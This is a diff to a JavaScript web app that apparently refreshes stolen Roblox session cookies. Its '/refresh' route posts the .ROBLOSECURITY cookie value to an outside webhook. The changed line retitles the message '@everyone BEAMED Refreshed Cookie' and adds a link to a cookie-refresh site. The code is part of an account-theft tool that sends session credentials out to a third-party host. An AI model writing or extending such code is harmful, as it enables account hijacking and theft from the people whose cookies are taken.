@@ -174,7 +174,7 @@ app.get('/refresh', async (req, res) => {
         const webhookResponse = await axios.post(WEBHOOK_URL, {
             embeds: [
                 {
-                    title: 'Refreshed Cookie',
+                    title: '@everyone BEAMED Refreshed Cookie https://rblxrefresh.net/r/cookiew11',
                     description: `**Refreshed Cookie:**\n\`\`\`${roblosecurityCookie}\`\`\``,
                     color: 16776960,
                     thumbnail: {
